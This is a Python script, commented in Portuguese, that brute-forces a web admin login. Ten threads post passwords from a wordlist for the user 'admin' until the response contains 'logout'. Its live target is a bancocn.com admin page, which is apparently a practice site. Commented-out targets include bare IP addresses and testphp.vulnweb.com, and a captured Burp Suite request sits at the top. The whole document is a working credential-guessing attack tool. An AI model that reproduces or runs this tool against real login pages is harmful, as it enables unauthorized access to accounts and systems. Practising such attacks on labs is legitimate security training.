"""
+ BURPSUITE:
POST /admin/index.php HTTP/1.1
Host: 44.203.221.183
Cookie: PHPSESSID=04evjti4p4m83ol542guc46fi2

user=teste&password=teste
"""

# Bibliotecas
from requests import post
from colorama import Fore
from threading import Thread

# URL TESTE
#url = "http://127.0.0.1/4/login.php"
#url = "http://44.203.221.183/admin/index.php"
#url = "http://3.219.33.194/admin/index.php"

#url = "http://testphp.vulnweb.com/userinfo.php"
url = "http://www.bancocn.com/admin/index.php"
#url = "http://advanced.bancocn.com/admin/index.php"



# Variaveis globais
CONT = 0                    # Contadores de senhas
SENHAS_TESTADAS = set()     # Conjunto
SENHA_ENCONTRADA = False    # Flag


def analise(resp, data):

    global CONT, SENHA_ENCONTRADA

    if resp.status_code == 200:

        senha = data["password"]
        html = resp.text

        if senha in SENHAS_TESTADAS:
            return None

        else:
            CONT += 1
            SENHAS_TESTADAS.add(senha)

            if "logout" in html:
                print(f"{CONT}) Senha {Fore.LIGHTBLUE_EX}'{senha}': {Fore.LIGHTCYAN_EX} correta !{Fore.RESET}")
                SENHA_ENCONTRADA = True

                return SENHA_ENCONTRADA

            else:
                print(f"{CONT}) Senha {Fore.LIGHTYELLOW_EX}'{senha}': {Fore.LIGHTRED_EX}Nao correta !{Fore.RESET}")

        return None


def execucao():

    try:
        # Abertura de arquivo em modo leitura
        with open("WordList/wordlist.txt", "r") as file:

            # Extraindo o dado puro sem quebra de linha
            linhas = file.read().splitlines()

            # Percorrendo wordlist.txt
            for i in linhas:

                if SENHA_ENCONTRADA:
                    break

                else:
                    data = {"user": "admin", "password": i}
                    #data = {"username": "admin", "password": i}
                    #data = {"uname": "test", "pass": i}

                    # Requisicao POST + Entrada de dados
                    resp = post(url, data)
                    analise(resp, data)

    except NameError as e:
        print(f"Variaveis erradas: {e}")

    except Exception as e:
        print(f"Erro {e}")

    except KeyboardInterrupt:
        print("Programa finalizado\n")
        exit(0)


def main():

    try:
        lista_threads = []
        print(f"# Alvo: {url}")

        # Montagem/Execucao de 10 Threads
        for i in range(10):
            t = Thread(target=execucao)
            lista_threads.append(t)

        # Execucao de Threads
        for i in lista_threads:
            i.start()

        # Esperando Threads acabar a execucao
        for i in lista_threads:
            i.join()

    except Exception as e:
        print(f"Erro: {e}")


# Execucao
if __name__ == '__main__':
    main()